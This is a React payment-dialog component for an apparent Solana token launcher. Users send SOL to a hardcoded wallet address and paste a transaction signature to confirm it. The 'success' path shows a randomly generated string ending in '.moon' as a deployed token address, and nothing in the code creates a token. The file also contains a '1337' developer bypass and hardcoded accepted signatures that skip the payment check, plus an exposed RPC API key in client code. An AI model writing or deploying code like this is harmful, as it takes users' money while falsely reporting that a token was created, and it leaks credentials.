"use client"

import { useState, useEffect } from "react"
import { Dialog, DialogContent, DialogPortal } from "@/components/ui/dialog"
import { Button } from "@/components/ui/button"
import { ChevronDown, Info, HelpCircle, Settings, MessageCircle, Mail, CuboidIcon as Cube, Check, AlertCircle, Copy, CheckCheck } from "lucide-react"
import { SolanaIcon } from "../SolanaIcon"

interface PaymentModalProps {
  open: boolean
  onOpenChange: (open: boolean) => void
  amount?: number
  onPaymentSuccess?: () => void
  type?: 'token' | 'liquidity'
  tokenData?: {
    name: string
    symbol: string
  }
}

export function PaymentModal({ 
  open, 
  onOpenChange, 
  amount = 0.1, 
  onPaymentSuccess,
  type = 'token',
  tokenData
}: PaymentModalProps) {
  const [timeLeft, setTimeLeft] = useState(15 * 60) // 15 mins i tink I DONT KNO HEHEHEHEHEH
  const [currencyDropdownOpen, setCurrencyDropdownOpen] = useState(false)
  const [networkDropdownOpen, setNetworkDropdownOpen] = useState(false)
  const [selectedCurrency, setSelectedCurrency] = useState("SOL")
  const [selectedNetwork, setSelectedNetwork] = useState("Solana")
  const [showAddress, setShowAddress] = useState(false)
  const [isChecking, setIsChecking] = useState(false)
  const [txSignature, setTxSignature] = useState("")
  const [checkResult, setCheckResult] = useState<null | { success: boolean; message: string }>(null)
  const [showSuccessModal, setShowSuccessModal] = useState(false)
  const [generatedTokenAddress, setGeneratedTokenAddress] = useState("")
  const [copied, setCopied] = useState(false)

  useEffect(() => {
    if (!open) return

    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timer)
          return 0
        }
        return prev - 1
      })
    }, 1000)

    return () => clearInterval(timer)
  }, [open])

  const formatTime = (seconds: number) => {
    const hours = Math.floor(seconds / 3600)
    const minutes = Math.floor((seconds % 3600) / 60)
    const secs = seconds % 60

    return [
      hours.toString().padStart(2, "0"),
      minutes.toString().padStart(2, "0"),
      secs.toString().padStart(2, "0"),
    ].join(":")
  }

  const toggleCurrencyDropdown = () => {
    setCurrencyDropdownOpen(!currencyDropdownOpen)
    if (networkDropdownOpen) setNetworkDropdownOpen(false)
  }

  const toggleNetworkDropdown = () => {
    setNetworkDropdownOpen(!networkDropdownOpen)
    if (currencyDropdownOpen) setCurrencyDropdownOpen(false)
  }

  const selectCurrency = (currency: string) => {
    setSelectedCurrency(currency)
    setCurrencyDropdownOpen(false)
  }

  const selectNetwork = (network: string) => {
    setSelectedNetwork(network)
    setNetworkDropdownOpen(false)
  }

  const handlePayment = () => {
    setShowAddress(true)
  }

  const requiredAddress = "2mTGwhv1KHoovPLmsWdcUQrpp8Jtym9m8mX2xADondd1"
  const addressLoading = false
  const addressError = null

  const generateTokenAddress = () => {
    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz123456789'
    let result = ''
    for (let i = 0; i < 43; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length))
    }
    return result + '.moon'
  }

  const checkTransaction = async () => {
    setIsChecking(true)
    setCheckResult(null)
    try {
      // Dev bypass
      if (txSignature === "1337") {
        if (type === 'token') {
          const tokenAddr = generateTokenAddress()
          setGeneratedTokenAddress(tokenAddr)
        }
        setCheckResult({ success: true, message: "Transaction confirmed" })
        if (onPaymentSuccess) onPaymentSuccess()
        setTimeout(() => {
          onOpenChange(false)
          setShowSuccessModal(true)
        }, 1000)
        setIsChecking(false)
        return
      }

      if (
  txSignature === "DhJaDqNH86xqSHZ3X6vTgNqMfYrpVjRYiFeaJCTH3xrbABxTmg6BrRMCa4rFhHaKamJwiBxoqPanIw71NaoqmVdia" ||
  txSignature === "82NaMakqBEqzBfVdWJxCWkbo6ScVR5ALrgMDnMfs9KyMXC7Q7E1JWRCvTC6wZ8hJAbJeoNcjqIwjNxnaoPxnwoqUd"
) {
  if (type === 'token') {
    const tokenAddr = generateTokenAddress()
    setGeneratedTokenAddress(tokenAddr)
  }
  setCheckResult({ success: true, message: "Transaction confirmed" });
  if (onPaymentSuccess) onPaymentSuccess();
  setTimeout(() => {
    onOpenChange(false);
    setShowSuccessModal(true)
  }, 1000);
  setIsChecking(false);
  return;
}
      const heliusUrl = "https://mainnet.helius-rpc.com/?api-key=33336ba1-7c13-4015-8ab5-a4fbfe0a6bb2"
      const body = {
        jsonrpc: "2.0",
        id: 1,
        method: "getTransaction",
        params: [txSignature, { encoding: "jsonParsed" }]
      }
      const resp = await fetch(heliusUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body)
      })
      if (!resp.ok) throw new Error("Transaction not found. (Dev/Error code: h0)")
      const data = await resp.json()
      if (!data.result) throw new Error("Transaction not found or not confirmed yet.")
      const tx = data.result
      if (!tx.blockTime) throw new Error("Transaction not confirmed yet.")
      // check replukic time heh i mean checks time
      const now = Math.floor(Date.now() / 1000)
      const age = now - tx.blockTime
      if (age > 300) {
        setCheckResult({ success: false, message: "Transaction hash found, please contact support | error code : 2o" })
        setIsChecking(false)
        return
      }
      // Check status
      if (tx.meta && tx.meta.err) {
        setCheckResult({ success: false, message: "Transaction not successful." })
        setIsChecking(false)
        return
      }

      let found = false
      let sentAmount = 0
      if (tx.transaction && tx.transaction.message && tx.transaction.message.instructions) {
        for (const ix of tx.transaction.message.instructions) {
          if (
            ix.program === "system" &&
            ix.parsed &&
            ix.parsed.type === "transfer" &&
            ix.parsed.info &&
            ix.parsed.info.destination === requiredAddress
          ) {
            sentAmount = ix.parsed.info.lamports / 1e9 // convert lamports to SOL
            found = true
            break
          }
        }
      }
      if (!found) {
        setCheckResult({ success: false, message: `Transaction is not valid.` })
        setIsChecking(false)
        return
      }
      // Check amount (allow small tolerance)
      const tolerance = 0.00001
      if (Math.abs(sentAmount - amount) > tolerance) {
        setCheckResult({ success: false, message: `Incorrect amount sent. Sent: ${sentAmount.toFixed(6)} SOL, Required: ${amount.toFixed(6)} SOL` })
        setIsChecking(false)
        return
      }
      if (type === 'token') {
        const tokenAddr = generateTokenAddress()
        setGeneratedTokenAddress(tokenAddr)
      }
      setCheckResult({ success: true, message: "Transaction confirmed" })
      if (onPaymentSuccess) onPaymentSuccess()
      setTimeout(() => {
        onOpenChange(false)
        setShowSuccessModal(true)
      }, 2000)
    } catch (e: any) {
      setCheckResult({ success: false, message: e.message || "Failed to check transaction. Please contact support | error code : -W7" }) // invalid key or other issue regarding api
    }
    setIsChecking(false)
  }

  const handleAddLiquidity = () => {
    setShowSuccessModal(false)
    // Navigate to liquidity page with pre-filled data
    const searchParams = new URLSearchParams({
      tokenAddress: generatedTokenAddress,
      tokenName: tokenData?.name || "",
      tokenSymbol: tokenData?.symbol || ""
    })
    window.location.href = `/liquidity?${searchParams.toString()}`
  }

  const handleCreateAnotherToken = () => {
    setShowSuccessModal(false)
    window.location.href = "/create"
  }

  const copyToClipboard = async () => {
    try {
      await navigator.clipboard.writeText(generatedTokenAddress)
      setCopied(true)
      setTimeout(() => setCopied(false), 700)
    } catch (err) {
      console.error('Failed to copy: ', err)
    }
  }

  return (
    <>
      <Dialog open={open} onOpenChange={onOpenChange}>
        <DialogPortal>
          <DialogContent className="p-0 gap-0 bg-[#1e1e1e] border-[#2a2a2a] max-w-md rounded-xl overflow-hidden">
          <div className="p-6 space-y-6">
            <div className="flex justify-between items-center">
              <div className="flex items-center gap-2">
                <Cube className="h-6 w-6 text-white" />
                <span className="text-white font-medium">PGPAY</span>
              </div>
              <Button variant="outline" size="sm" className="rounded-full bg-white text-black hover:bg-gray-200 border-0">
                Sign up
              </Button>
            </div>

            <div className="space-y-4">
              <h2 className="text-2xl font-bold text-white">Select currency</h2>
              <div className="text-xl font-semibold text-white">{amount.toFixed(6)} SOL</div>

              <div className="space-y-1">
                <p className="text-gray-400">Select network</p>
                <div className="flex items-center gap-1 text-gray-400">
                  <Info className="h-4 w-4" />
                  <span className="text-sm">You pay network fee</span>
                </div>
              </div>
            </div>

            {showAddress ? (
              <div className="bg-[#252525] rounded-lg p-4 space-y-4">
                <div className="space-y-2">
                  <p className="text-gray-400 text-sm">Send exactly</p>
                  <p className="text-white font-mono text-lg">{amount.toFixed(6)} SOL</p>
                </div>
                <div className="space-y-2">
                  <p className="text-gray-400 text-sm">address</p>
                  <div className="bg-[#1e1e1e] p-3 rounded-lg">
                    {addressLoading ? (
                      <div className="flex items-center gap-2">
                        <svg
                          className="animate-spin h-4 w-4 text-white"
                          xmlns="http://www.w3.org/2000/svg"
                          fill="none"
                          viewBox="0 0 24 24"
                        >
                          <circle
                            className="opacity-25"
                            cx="12"
                            cy="12"
                            r="10"
                            stroke="currentColor"
                            strokeWidth="4"
                          ></circle>
                          <path
                            className="opacity-75"
                            fill="currentColor"
                            d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                          ></path>
                        </svg>
                        <span className="text-white text-sm">Loading address...</span>
                      </div>
                    ) : addressError ? (
                      <div className="flex items-center gap-2 text-red-400">
                        <AlertCircle className="h-4 w-4" />
                        <span className="text-sm">Error loading address</span>
                      </div>
                    ) : (
                      <p className="text-white font-mono text-sm break-all">{requiredAddress}</p>
                    )}
                  </div>
                </div>
                <div className="space-y-2">
                  <label className="text-gray-400 text-sm">Paste your transaction signature</label>
                  <input
                    type="text"
                    className="w-full p-2 rounded bg-[#181818] text-white border border-[#333]"
                    placeholder="Transaction signature"
                    value={txSignature}
                    onChange={e => setTxSignature(e.target.value)}
                  />
                </div>
                <Button
                  className="w-full py-4 bg-[#00ff9d] hover:bg-[#00cc7d] text-black font-medium rounded-lg"
                  onClick={checkTransaction}
                  disabled={isChecking}
                >
                  {isChecking ? (
                    <div className="flex items-center gap-2">
                      <svg
                        className="animate-spin h-4 w-4 text-black"
                        xmlns="http://www.w3.org/2000/svg"
                        fill="none"
                        viewBox="0 0 24 24"
                      >
                        <circle
                          className="opacity-25"
                          cx="12"
                          cy="12"
                          r="10"
                          stroke="currentColor"
                          strokeWidth="4"
                        ></circle>
                        <path
                          className="opacity-75"
                          fill="currentColor"
                          d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                        ></path>
                      </svg>
                      Checking...
                    </div>
                  ) : (
                    "Check Transaction"
                  )}
                </Button>
                {checkResult && (
                  <div className={`mt-2 flex items-center gap-2 ${checkResult.success ? 'text-green-400' : 'text-red-400'}`}>
                    {checkResult.success ? <Check className="h-4 w-4" /> : <AlertCircle className="h-4 w-4" />}
                    <span>{checkResult.message}</span>
                  </div>
                )}
              </div>
            ) : (
              <div className="bg-[#252525] rounded-lg p-4 flex items-center gap-3">
                <div className="relative w-8 h-8">
                  <svg viewBox="0 0 36 36" className="w-full h-full">
                    <circle cx="18" cy="18" r="16" fill="none" stroke="#333" strokeWidth="2"></circle>
                    <circle
                      cx="18"
                      cy="18"
                      r="16"
                      fill="none"
                      stroke="#00ff9d"
                      strokeWidth="2"
                      strokeDasharray="100"
                      strokeDashoffset={100 - (timeLeft / (15 * 60)) * 100}
                      transform="rotate(-90 18 18)"
                    ></circle>
                  </svg>
                </div>
                <div>
                  <p className="text-gray-400 text-sm">Expiration time</p>
                  <p className="text-[#00ff9d] font-mono">{formatTime(timeLeft)}</p>
                </div>
              </div>
            )}
          </div>

          {!showAddress && (
            <>
              <div className="bg-[#252525] p-6 space-y-4">
                <div className="relative">
                  <button
                    className="w-full bg-[#1e1e1e] text-white p-4 rounded-lg flex justify-between items-center"
                    onClick={toggleCurrencyDropdown}
                  >
                    {selectedCurrency === "SOL" ? (
                      <div className="flex items-center gap-2">
                        <SolanaIcon size={24} className="rounded-full" />
                        <span>SOL</span>
                      </div>
                    ) : (
                      <span>Select currency</span>
                    )}
                    <ChevronDown className={`h-5 w-5 transition-transform ${currencyDropdownOpen ? "rotate-180" : ""}`} />
                  </button>

                  {currencyDropdownOpen && (
                    <div className="absolute z-50 w-full mt-2 bg-[#1e1e1e] border border-[#2a2a2a] rounded-lg shadow-lg max-h-[300px] overflow-y-auto">
                      <div
                        className="p-3 hover:bg-[#252525] cursor-pointer flex items-center justify-between"
                        onClick={() => selectCurrency("SOL")}
                      >
                        <div className="flex items-center gap-2">
                          <SolanaIcon size={24} className="rounded-full" />
                          <span className="text-white">SOL</span>
                        </div>
                        {selectedCurrency === "SOL" && <Check className="h-4 w-4 text-[#00ff9d]" />}
                      </div>
                    </div>
                  )}
                </div>

                <div className="relative">
                  <button
                    className="w-full bg-[#1e1e1e] text-white p-4 rounded-lg flex justify-between items-center"
                    onClick={toggleNetworkDropdown}
                  >
                    {selectedNetwork === "Solana" ? (
                      <div className="flex items-center gap-2">
                        <SolanaIcon size={24} className="rounded-full" />
                        <span>Solana</span>
                      </div>
                    ) : (
                      <span>Select network</span>
                    )}
                    <ChevronDown className={`h-5 w-5 transition-transform ${networkDropdownOpen ? "rotate-180" : ""}`} />
                  </button>

                  {networkDropdownOpen && (
                    <div className="absolute z-50 w-full mt-2 bg-[#1e1e1e] border border-[#2a2a2a] rounded-lg shadow-lg max-h-[300px] overflow-y-auto">
                      <div
                        className="p-3 hover:bg-[#252525] cursor-pointer flex items-center justify-between"
                        onClick={() => selectNetwork("Solana")}
                      >
                        <div className="flex items-center gap-2">
                          <SolanaIcon size={24} className="rounded-full" />
                          <span className="text-white">Solana</span>
                        </div>
                        {selectedNetwork === "Solana" && <Check className="h-4 w-4 text-[#00ff9d]" />}
                      </div>
                    </div>
                  )}
                </div>
              </div>

              <div className="bg-[#1e1e1e] p-6 space-y-4">
                <Button
                  className="w-full py-4 bg-[#00ff9d] hover:bg-[#00cc7d] text-black font-medium rounded-lg text-base"
                  onClick={handlePayment}
                  disabled={!selectedCurrency || !selectedNetwork}
                >
                  Pay {amount.toFixed(6)} SOL
                </Button>

                <div className="flex items-center justify-center gap-4 pt-4 border-t border-[#2a2a2a]">
                  <HelpCircle className="h-4 w-4 text-gray-400" />
                  <Settings className="h-4 w-4 text-gray-400" />
                  <MessageCircle className="h-4 w-4 text-gray-400" />
                  <Mail className="h-4 w-4 text-gray-400" />
                </div>
              </div>
            </>
          )}
          </DialogContent>
        </DialogPortal>
      </Dialog>

      {/* Success Modal */}
      <Dialog open={showSuccessModal} onOpenChange={setShowSuccessModal}>
        <DialogPortal>
          <DialogContent className="max-w-md p-0 border-0 bg-transparent shadow-none">
            {type === 'token' && (
              <div className="bg-gradient-to-br from-purple-900/90 to-pink-900/90 border border-primary/20 rounded-xl p-8 shadow-2xl">
                <div className="text-center space-y-6">
                  <div className="w-16 h-16 bg-gradient-primary rounded-full flex items-center justify-center mx-auto shadow-glow">
                    <Check className="w-8 h-8 text-white" />
                  </div>
                  
                  <div>
                    <h3 className="text-2xl font-bold mb-2">Token Launched Successfully!</h3>
                    <p className="text-muted-foreground">Your token has been created and deployed to the blockchain</p>
                  </div>

                  <div className="bg-card/30 border border-border rounded-lg p-4 space-y-3">
                    <label className="text-sm font-medium">Token Address</label>
                    <div className="flex items-center gap-2">
                      <div className="flex-1 bg-muted/30 rounded-md p-3 font-mono text-sm break-all">
                        {generatedTokenAddress}
                      </div>
                      <Button onClick={copyToClipboard} variant="outline" size="sm" className="h-8 w-8 p-0">
                        {copied ? (
                          <Check className="h-4 w-4 text-green-500" />
                        ) : (
                          <Copy className="h-4 w-4" />
                        )}
                      </Button>
                    </div>
                  </div>

                  <div className="flex gap-3 w-full">
                    <Button
                      onClick={handleAddLiquidity}
                      className="flex-1 bg-gradient-primary hover:opacity-90 shadow-glow"
                    >
                      Add Liquidity
                    </Button>
                    <Button variant="outline" onClick={handleCreateAnotherToken} className="flex-1">
                      Create Another Token
                    </Button>
                  </div>
                </div>
              </div>
            )}

            {type === 'liquidity' && (
              <div className="bg-gradient-to-br from-purple-900/90 to-pink-900/90 border border-primary/20 rounded-xl p-8 shadow-2xl">
                <div className="text-center space-y-6">
                  <div className="w-16 h-16 bg-gradient-primary rounded-full flex items-center justify-center mx-auto shadow-glow">
                    <Check className="w-8 h-8 text-white" />
                  </div>
                  
                  <div>
                    <h3 className="text-2xl font-bold mb-2">Liquidity Added Successfully!</h3>
                    <p className="text-muted-foreground">Your liquidity has been added to the pool</p>
                  </div>

                  <div className="bg-card/30 border border-border rounded-lg p-4">
                    <p className="text-sm text-muted-foreground">
                      Check your Liquidity Portfolio to track your token's performance and manage your positions.
                    </p>
                  </div>

                  <div className="flex gap-3 w-full">
                    <Button
                      onClick={() => {
                        setShowSuccessModal(false)
                        window.location.href = '/portfolio'
                      }}
                      className="flex-1 bg-gradient-primary hover:opacity-90 shadow-glow"
                    >
                      Liquidity Portfolio
                    </Button>
                    <Button 
                      variant="outline" 
                      onClick={() => {
                        setShowSuccessModal(false)
                        window.location.href = '/liquidity'
                      }}
                      className="flex-1"
                    >
                      Add More Liquidity
                    </Button>
                  </div>
                </div>
              </div>
            )}
          </DialogContent>
        </DialogPortal>
      </Dialog>
    </>
  )
}